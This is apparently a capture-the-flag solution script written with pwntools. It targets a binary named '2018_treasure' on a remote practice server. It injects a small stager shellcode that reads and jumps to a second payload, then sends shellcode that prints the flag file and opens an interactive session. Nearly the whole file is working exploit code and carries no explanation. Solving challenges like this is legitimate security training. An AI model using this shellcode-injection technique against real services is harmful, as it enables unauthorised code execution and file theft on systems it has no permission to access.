from pwn import *

context.arch = 'amd64'
context.os = 'linux'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

#p = process('./2018_treasure')
p = remote('node4.buuoj.cn', 25891)

def sendshellcode(c):
    sa(b') :', b'\n')
    sl(b'')
    sa(b'start!!!!', c)

shellcode = asm('xchg rdx, rsi; syscall; jmp rsi;')
sendshellcode(shellcode)

sleep(0.1)

p.sendline(b'a' * 5 + asm(shellcraft.cat('flag')))

p.interactive()